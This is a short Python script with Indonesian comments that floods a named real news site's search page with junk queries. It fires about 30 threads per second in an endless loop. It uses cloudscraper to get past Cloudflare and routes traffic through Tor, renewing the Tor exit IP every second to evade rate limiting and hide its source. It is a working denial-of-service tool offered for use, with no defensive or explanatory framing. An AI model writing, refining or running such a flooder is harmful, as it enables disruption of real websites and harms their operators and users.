import cloudscraper
import threading
import time
from stem import Signal
from stem.control import Controller

proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

scraper = cloudscraper.create_scraper()
url = "https://mitraberita.net/?s=sdgsdgsdg&post_type=post"

def fetch(index):
    try:
        resp = scraper.get(url, proxies=proxies, timeout=15)
        print(f"[{index}] Status: {resp.status_code}")
    except Exception as e:
        print(f"[{index}] Error: {e}")

def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()  # Jika ada password, tambahkan: authenticate(password='your_password')
            controller.signal(Signal.NEWNYM)
            print("[*] Tor IP renewed")
    except Exception as e:
        print(f"[!] Gagal renew IP Tor: {e}")

def request_loop():
    counter = 1
    while True:
        for _ in range(30):
            threading.Thread(target=fetch, args=(counter,)).start()
            counter += 1
            time.sleep(1/30)

def ip_renew_loop():
    while True:
        renew_tor_ip()
        time.sleep(1)  # ganti IP tiap 1 detik

if __name__ == "__main__":
    # Jalankan thread untuk request dan rotasi IP bersamaan
    threading.Thread(target=ip_renew_loop, daemon=True).start()
    request_loop()
